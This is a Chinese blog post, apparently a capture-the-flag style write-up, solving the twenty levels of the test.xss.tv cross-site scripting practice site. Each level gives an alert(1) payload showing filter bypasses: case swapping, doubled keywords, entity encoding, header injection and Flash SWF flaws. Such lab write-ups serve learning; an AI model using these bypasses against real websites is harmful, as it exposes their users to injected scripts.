@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="某位大佬天天说我不写博客，下面就随便写写寒假见闻之一xss，有错误请指出Orz 一个很有趣的xss平台 ：http://test.xss.tv/">
+<meta name="keywords" content="web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss">
+<meta property="og:url" content="http://yoursite.com/2019/03/02/xss/index.html">
+<meta property="og:site_name" content="Glarcy">
+<meta property="og:description" content="某位大佬天天说我不写博客，下面就随便写写寒假见闻之一xss，有错误请指出Orz 一个很有趣的xss平台 ：http://test.xss.tv/">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/img/xss/home.png">
+<meta property="og:image" content="http://yoursite.com/img/xss/10_1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/xss/10_2.jpg">
+<meta property="og:image" content="http://yoursite.com/img/xss/11_1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/xss/11_2.png">
+<meta property="og:image" content="http://yoursite.com/img/xss/11_3.png">
+<meta property="og:image" content="http://yoursite.com/img/xss/12_1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/xss/13_1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/xss/15_1.png">
+<meta property="og:image" content="http://yoursite.com/img/xss/15_2.jpg">
+<meta property="og:image" content="http://yoursite.com/img/xss/15_3.jpg">
+<meta property="og:image" content="http://yoursite.com/img/xss/19_1.png">
+<meta property="og:image" content="http://yoursite.com/img/xss/20_1.png">
+<meta property="og:updated_time" content="2019-06-02T08:44:08.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss">
+<meta name="twitter:description" content="某位大佬天天说我不写博客，下面就随便写写寒假见闻之一xss，有错误请指出Orz 一个很有趣的xss平台 ：http://test.xss.tv/">
+<meta name="twitter:image" content="http://yoursite.com/img/xss/home.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/02/xss/">
+
+
+
+
+
+  <title>xss | Glarcy</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Glarcy</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/02/xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Glarcy">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glarcy">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xss</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-02T15:51:27+08:00">
+                2019-03-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>某位大佬天天说我不写博客，下面就随便写写寒假见闻之一xss，有错误请指出Orz</p>
+<p>一个很有趣的xss平台 ：<a href="http://test.xss.tv/" target="_blank" rel="noopener">http://test.xss.tv/</a></p>
+<a id="more"></a>
+<p><img src="../../../../img/xss/home.png" alt></p>
+<h4 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h4><p>第一关很简单，可以看到url上的name参数会随着输入值的变化反映到页面上，最简单的payoad：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;img src=@ onerror=alert(1) /&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h4><p>第二关输入的值在input标签里面，因此先闭合标签再输入payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=@ onerror=alert(1) /&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h4><p>在第三关的输入框里再输入上述payload是不成功的，通过查看源代码我们可以发现输入值是用’xxx’单引号引起来的，因此我们也要用单引号闭合，并且我们还可以看到&lt;&gt;被转码了，因此输入以下payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onmouseover=&apos;alert(1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h4><p>这题跟上题一样，只是单引号变成了双引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h4><p>输入上述payload，发现不成功，发现on被转换成了o_n，输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现script被转换成了scr_ipt，于是换一个标签<a></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&apos;javascript:alert(1)&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h4><p>继续输入上述payload，发现href也被转换成了hr_ef，使用大小写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hRef=&apos;javascript:alert(1)&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h4><p>重复上述的payload，发现on href script都被替换成了空， 尝试双写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; oonnmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h4><p>经过测试发现javascript被替换成了javascr_ipt，data也被替换成了da_ta，最后使用html自解码机制绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;#99;ript:alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>提交之后需要点击“友情链接”跳转</p>
+<h4 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h4><p>随便输点东西，重复上述payload，提示链接不合法，于是尝试输入一个正常的http开头的网址：<a href="http://test.xss.tv/" target="_blank" rel="noopener">http://test.xss.tv/</a> ，发现成功了，尝试一下https开头的正常的网址<a href="https://www.baidu.com" target="_blank" rel="noopener">https://www.baidu.com</a> ，发现同样是不合法的，于是猜测得包含http，经过测试，payload中需包含http://才是合法链接，于是尝试输入payload：javascript:alert(1)//http:// ，发现javascript依旧被替换了，并且大小写不敏感，于是可使用上述的html自解码机制绕过，最终payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;#99;ript:alert(1)//http://</span><br></pre></td></tr></table></figure>
+
+<p>同样需要点击触发</p>
+<h4 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h4><p>查看源代码发现有三个隐藏的输入框</p>
+<p><img src="../../../../img/xss/10_1.jpg" alt></p>
+<p>经过测试，发现只有t_sort可控</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level10.php?keyword=aaa&amp;t_sort=aaa</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/xss/10_2.jpg" alt></p>
+<p>由于hidden特性导致触发不了xss，因此我们可以先让它输出一个标准的输入框</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level10.php?keyword=aaa&amp;t_sort=&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
+
+<p>最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level10.php?keyword=aaa&amp;t_sort=&quot; onmouseover=alert(1) type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h4><p>查看源代码发现相比上一题有多了个t_ref的隐藏框</p>
+<p><img src="../../../../img/xss/11_1.jpg" alt></p>
+<p>尝试修改，发现不成功，ref联想到请求头，查看请求头，发现Referer的内容跟t_ref的value是一样</p>
+<p><img src="../../../../img/xss/11_2.png" alt></p>
+<p>于是尝试抓包修改，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=alert(1) type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/xss/11_3.png" alt></p>
+<h4 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h4><p>这题跟上题一样，插入点不一样，这题的t_ref换成了t_ua，可以联想到user-agent，</p>
+<p><img src="../../../../img/xss/12_1.jpg" alt></p>
+<h4 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h4><p>这题t_ua又换成了t_cook，即cookie</p>
+<p><img src="../../../../img/xss/13_1.jpg" alt></p>
+<h4 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h4><p>这题似乎没有了，点进去也是404，据说是关图片exif的xss，就不说了</p>
+<h4 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h4><p>查看源代码可以发现有一个可疑的参数ng-include，一开始不知道什么意思，去百度了一下，发现它可以包含html文件，在引用其它页面时需要用一个单引号括起来，并且它有一个src属性，包含的文件还不能跨域</p>
+<p><img src="../../../../img/xss/15_1.png" alt></p>
+<p>但是我不知道怎么传进去，只知道它有一个src属性，于是碰碰运气试一试，成功了</p>
+<p><img src="../../../../img/xss/15_2.jpg" alt></p>
+<p>接下来我们就可以利用了，因为不能跨域，因此我们可以尝试包含一下第一关的页面</p>
+<p><img src="../../../../img/xss/15_3.jpg" alt></p>
+<p>第一关页面都出来了，那我们直接拿第一关的payload就可以过关了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level15.php?src=&apos;level1.php?name=&lt;img src=@ onerror=alert(1) /&gt;&apos;</span><br></pre></td></tr></table></figure>
+
+<h4 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h4><p>这一关的空格、斜杠（/）都被替换成了&amp;nbsp;，我们可以用%0a绕过，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level16.php?keyword=&lt;img%0asrc=@%0aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h4><p>看到xsf以为是flash xss，去研究了一下，但是没找到入口，于是尝试了一下arg01和arg02这两个参数，发现只要在arg02后面加上payload就可以了</p>
+<p>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level17.php?arg01=a&amp;arg02=b onmouseover=alert(1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h4><p>同level 17的payload一样</p>
+<h4 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h4><p>flash xss，首先下载文件使用JPEXS进行分析，发现是actionscript 2.0，在flash中actionscript2.0可以使用getURL来执行javascript，定位getURL函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sIFR.menuItems.push(new ContextMenuItem(&quot;Follow link&quot;,function()</span><br><span class="line">&#123;</span><br><span class="line">    getURL(sIFR.instance.primaryLink,sIFR.instance.primaryLinkTarget);</span><br><span class="line">&#125;),new ContextMenuItem(&quot;Open link in new window&quot;,function()</span><br><span class="line">&#123;</span><br><span class="line">    getURL(sIFR.instance.primaryLink,&quot;_blank&quot;);</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>
+
+<p>再追踪sIFR的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if(_loc4_ == &quot;undefined&quot; || _loc4_ == &quot;&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    var _loc6_ = flash.external.ExternalInterface.call(&quot;sIFR.__resetBrokenMovies&quot;);</span><br><span class="line">    if(_loc6_)</span><br><span class="line">    &#123;</span><br><span class="line">       return undefined;</span><br><span class="line">    &#125;</span><br><span class="line">    _loc4_ = sIFR.DEFAULT_TEXT;</span><br><span class="line">    _loc5_ = false;</span><br><span class="line">&#125;</span><br><span class="line">if(_loc5_ &amp;&amp; _root.version != sIFR.VERSION)</span><br><span class="line">&#123;</span><br><span class="line">    _loc4_ = sIFR.VERSION_WARNING.split(&quot;%s&quot;).join(_root.version);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现当getURL打开时，version参数可以传入_loc4_中，即sIFR的内容，但是getURL只在内容为link时打开，因此定位contentIsLink函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function contentIsLink()</span><br><span class="line">&#123;</span><br><span class="line">    return this.content.indexOf(&quot;&lt;a &quot;) == 0 &amp;&amp; (this.content.indexOf(&quot;&lt;a &quot;) == this.content.lastIndexOf(&quot;&lt;a &quot;) &amp;&amp; this.content.indexOf(&quot;&lt;/a&gt;&quot;) == this.content.length - 4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此构造如下payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level19.php?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/xss/19_1.png" alt></p>
+<p>点击图中的xss即可触发</p>
+<h4 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h4><p>下载swf文件进行分析，发现是zeroclipboard.swf</p>
+<p><img src="../../../../img/xss/20_1.png" alt></p>
+<p><a href="https://www.freebuf.com/sectool/108568.html" target="_blank" rel="noopener">zeroclipboard.swf</a>从url中获取参数，传给调用的 ExternalInterface.call函数，实际上浏览器的执行过程为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try &#123;__flash__toXML(ZeroClipboard.dispatch(&quot;id&quot;)); &#125; catch (e) &#123; &quot;&quot;; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>当注入的js含有 “ 符号，会被转义为\“ ，但是由于没有过滤参数中的反斜杠（\），因此如果注入\“，就会被转义\\“，这样 “ 符号就变得有意义了，也就是可以闭合之前的双引号，从而构造出完全独立的javascript，从而导致xss，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level20.php?arg01=id&amp;arg02=\%22));&#125;catch(e)&#123;alert(1);&#125;//%26width=500%26height=500</span><br></pre></td></tr></table></figure>
+
+<p>参考书籍：《Web前端黑客技术揭秘》</p>
+<p>参考链接：<a href="https://www.freebuf.com/sectool/108568.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/108568.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/11/SSTI模板注入/" rel="prev" title>
+                 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Glarcy">
+            
+              <p class="site-author-name" itemprop="name">Glarcy</p>
+              <p class="site-description motion-element" itemprop="description">web小菜鸡</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io/" title="Twings" target="_blank">Twings</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xi4or0uji.github.io/" title="Xi4or0uji" target="_blank">Xi4or0uji</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://23r3f.github.io/" title="23R3F" target="_blank">23R3F</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://zszcr.github.io/" title="zs0zrc" target="_blank">zs0zrc</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#level-1"><span class="nav-number">1.</span> <span class="nav-text">level 1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-2"><span class="nav-number">2.</span> <span class="nav-text">level 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-3"><span class="nav-number">3.</span> <span class="nav-text">level 3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-4"><span class="nav-number">4.</span> <span class="nav-text">level 4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-5"><span class="nav-number">5.</span> <span class="nav-text">level 5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-6"><span class="nav-number">6.</span> <span class="nav-text">level 6</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-7"><span class="nav-number">7.</span> <span class="nav-text">level 7</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-8"><span class="nav-number">8.</span> <span class="nav-text">level 8</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-9"><span class="nav-number">9.</span> <span class="nav-text">level 9</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-10"><span class="nav-number">10.</span> <span class="nav-text">level 10</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-11"><span class="nav-number">11.</span> <span class="nav-text">level 11</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-12"><span class="nav-number">12.</span> <span class="nav-text">level 12</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-13"><span class="nav-number">13.</span> <span class="nav-text">level 13</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-14"><span class="nav-number">14.</span> <span class="nav-text">level 14</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-15"><span class="nav-number">15.</span> <span class="nav-text">level 15</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-16"><span class="nav-number">16.</span> <span class="nav-text">level 16</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-17"><span class="nav-number">17.</span> <span class="nav-text">level 17</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-18"><span class="nav-number">18.</span> <span class="nav-text">level 18</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-19"><span class="nav-number">19.</span> <span class="nav-text">level 19</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level-20"><span class="nav-number">20.</span> <span class="nav-text">level 20</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Glarcy</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
